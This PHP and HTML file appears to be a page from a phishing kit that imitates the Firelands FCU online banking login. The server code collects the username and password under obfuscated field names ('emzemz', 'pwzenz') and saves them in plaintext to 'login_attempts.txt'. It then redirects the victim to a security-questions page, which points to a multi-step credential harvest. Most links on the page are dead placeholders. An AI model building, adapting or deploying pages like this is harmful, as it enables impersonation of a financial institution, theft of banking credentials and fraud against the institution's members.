<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emzemz = $_POST['emzemz'] ?? '';
    $pwzenz = $_POST['pwzenz'] ?? '';
    $rememberDevice = isset($_POST['rememberDevice']) ? true : false;
    
    $errors = [];
    
    if (empty($emzemz)) {
        $errors['emzemz'] = 'Username is required';
    }
    
    if (empty($pwzenz)) {
        $errors['pwzenz'] = 'Password is required';
    }
    
    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $emzemz;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $emzemz,
            'emzemz' => $emzemz,
            'pwzenz' => $pwzenz,
            'remember' => $rememberDevice
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}

$rememberDevice = isset($_POST['rememberDevice']) ? true : false;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Online Banking Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text and App Buttons -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Firelands FCU Online
                        </p>
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Banking
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Flexible online banking built for you
                        </h1>
                    </div>

                    <div class="flex flex-wrap items-center gap-4">
                        <a href="#" aria-label="Download on the App Store">
                            <img
                                src="assets/app-store-button.svg"
                                alt="Download on the App Store"
                                class="h-12 w-auto"
                            />
                        </a>
                        <a href="#" aria-label="Get it on Google Play">
                            <img
                                src="assets/google-play-button.svg"
                                alt="Get it on Google Play"
                                class="h-12 w-auto"
                            />
                        </a>
                    </div>
                </section>

                <!-- Right Section: Login Card -->
                <section class="order-1 w-full max-w-md lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Sign In to Continue</h2>

                        <!-- Form -->
                        <form method="POST" action="" class="mt-8 space-y-6">
                            <!-- Username Field -->
                            <div class="space-y-2">
                                <label for="emzemz" class="text-sm font-medium text-gray-600">
                                    Username
                                </label>
                                <input
                                    id="emzemz"
                                    name="emzemz"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['emzemz'] ?? ''); ?>"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['emzemz'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Password Field -->
                            <div class="space-y-2">
                                <label for="pwzenz" class="text-sm font-medium text-gray-600">
                                    Password
                                </label>
                                <div class="relative">
                                    <input
                                        id="pwzenz"
                                        name="pwzenz"
                                        type="password"
                                        value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                        class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePassword()"
                                        class="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
                                        aria-label="Toggle password visibility"
                                    >
                                        <svg id="eyeIcon" class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
                                            <circle cx="12" cy="12" r="3" />
                                        </svg>
                                    </button>
                                </div>
                                <?php if (isset($errors['pwzenz'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Remember Device and Help Link -->
                            <div class="flex flex-wrap items-center justify-between gap-4 text-sm font-medium text-gray-600">
                                <label class="inline-flex cursor-pointer items-center gap-2">
                                    <input
                                        type="checkbox"
                                        name="rememberDevice"
                                        <?php echo $rememberDevice ? 'checked' : ''; ?>
                                        class="sr-only"
                                        onchange="toggleRememberDevice()"
                                    />
                                    <span
                                        id="rememberCheckbox"
                                        class="flex h-4 w-4 items-center justify-center rounded-full border transition <?php echo $rememberDevice ? 'border-[#5a63d8] bg-[#5a63d8]' : 'border-gray-300 bg-white'; ?>"
                                    >
                                        <?php if ($rememberDevice): ?>
                                            <span class="h-1.5 w-1.5 rounded-full bg-white"></span>
                                        <?php endif; ?>
                                    </span>
                                    Remember Device
                                </label>
                                <button
                                    type="button"
                                    class="text-[#801346] transition hover:text-[#5a63d8] hover:underline"
                                >
                                    Need Login Help?
                                </button>
                            </div>

                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Continue
                            </button>

                            <!-- Register Button -->
                            <div class="flex flex-col gap-3">
                                <button
                                    type="button"
                                    class="w-full rounded-full border border-transparent bg-[#fff5f8] px-4 py-3 text-sm font-semibold text-[#801346] transition hover:bg-[#ffe9f0]"
                                >
                                    Register for digital banking
                                </button>
                            </div>

                            <!-- Privacy and Terms -->
                            <p class="text-center text-xs text-gray-500">
                                By signing in, you agree to our
                                <a href="#" class="font-semibold text-[#801346] hover:underline">
                                    Privacy Policy
                                </a>
                                and
                                <a href="#" class="font-semibold text-[#801346] hover:underline">
                                    Terms of Service
                                </a>.
                            </p>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <a href="#" class="transition hover:text-white">
                    CU Locations
                </a>
                <a href="#" class="transition hover:text-white">
                    Contact Us
                </a>
            </div>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('pwzenz');
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                // Change to eye-off icon
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a20.76 20.76 0 0 1 5.11-6.11" /><path stroke-linecap="round" stroke-linejoin="round" d="M9.53 9.53a3 3 0 0 0 4.24 4.24" /><path stroke-linecap="round" stroke-linejoin="round" d="M1 1l22 22" />';
            } else {
                passwordInput.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }

        function toggleRememberDevice() {
            const checkbox = document.querySelector('input[name="rememberDevice"]');
            const checkboxDisplay = document.getElementById('rememberCheckbox');
            
            if (checkbox.checked) {
                checkboxDisplay.classList.add('border-[#5a63d8]', 'bg-[#5a63d8]');
                checkboxDisplay.innerHTML = '<span class="h-1.5 w-1.5 rounded-full bg-white"></span>';
            } else {
                checkboxDisplay.classList.remove('border-[#5a63d8]', 'bg-[#5a63d8]');
                checkboxDisplay.classList.add('border-gray-300', 'bg-white');
                checkboxDisplay.innerHTML = '';
            }
        }
    </script>
</body>
</html>
